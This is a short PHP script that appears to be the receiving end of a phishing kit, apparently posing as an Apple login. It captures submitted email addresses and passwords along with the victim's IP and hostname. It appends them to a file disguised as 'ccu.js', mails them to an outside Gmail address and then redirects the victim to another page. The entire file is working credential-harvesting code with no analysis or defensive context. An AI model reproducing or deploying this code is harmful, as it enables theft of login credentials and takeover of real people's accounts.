<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$domain = GetHostByName($REMOTE_ADDR);

$message .= "Email: ".$_POST['mail']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip." - ".$domain."\n";
$message .= "_____________________________\n";

$pula = fopen ("ccu.js" , "a");
fwrite ($pula , $message);
fclose ($pula);

$mailsubj="APPL - $ip";
$emailusr = "danne.danne001@gmail.com";
mail($emailusr, $mailsubj, $message);


header("Location: usr.html");
?>
